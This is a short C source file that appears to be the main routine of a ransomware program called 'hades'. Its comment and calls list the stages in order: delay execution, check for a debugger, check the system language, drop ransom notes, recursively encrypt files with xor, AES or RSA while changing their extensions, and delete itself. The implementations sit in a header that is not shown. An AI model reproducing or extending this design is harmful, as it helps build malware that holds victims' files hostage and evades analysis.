
#include "hades.h"

int
main(int argc, char *argv[])
{
    /*
    * 0. Sleep [on|off]
    * 1. Check debug [on|off]
    * 2. Check language [on|off]
    * 3. Add notes [on|off]
    * 4. Get files [recursively|directory], encrypt them [none|xor|aes|rsa], change extension [on|off]
    * 5. AutoDelete [on|off]
    */

    hades_sleep();

    hades_check_debug();

    hades_check_language();

    hades_add_notes();

    hades_crypt();

    hades_autodelete(argv[0]);

    return 0;
}